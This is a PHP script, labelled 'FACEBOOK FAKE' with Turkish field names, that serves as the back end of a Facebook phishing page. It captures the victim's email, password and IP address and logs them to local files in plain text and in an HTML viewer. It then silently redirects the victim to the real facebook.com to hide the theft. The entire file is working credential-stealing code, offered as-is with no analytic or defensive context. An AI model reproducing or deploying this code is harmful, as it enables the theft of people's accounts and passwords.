<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r";
    }
if (isset($_POST['email']) && isset($_POST['pass'])) {
$save = fopen("_command","w");
$save_2 = fopen("saved_info.txt","a+");
$username = $_POST['email'];
$password = $_POST['pass'];
date_default_timezone_set('Europe/Istanbul');
$tarih = date('d/m/Y H:i:s');
$command = ("
+-+-+ FACEBOOK FAKE +-+-+

 Tarih         : ".$tarih."

 İp Adresi     : ".$ipaddress."

 Kullanıcı Adı : ".$username."

 Şifre         : ".$password."

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
");
$saved_info = ("
<ul class='saved-box'>
	<li class='saved-title'>FACEBOOK FAKE</li><br>
	<li>Tarih         : <a>$tarih</a></li>
	<li>İp Adresi     : <a href='/ip-scan/index.php?ip=$ipaddress'>$ipaddress</a></li>
	<li>Kullanıcı Adı : <a>$username</a></li>
	<li>Şifre         : <a>$password</a></li>
</ul><hr><br>
");
fwrite($save,$command);
fwrite($save_2,$saved_info);
fclose($save);
fclose($save_2);	
}else{
	echo "<script>javascript:history.go(-1)</script>";
	exit();
}
header('Location: https://facebook.com');
?>
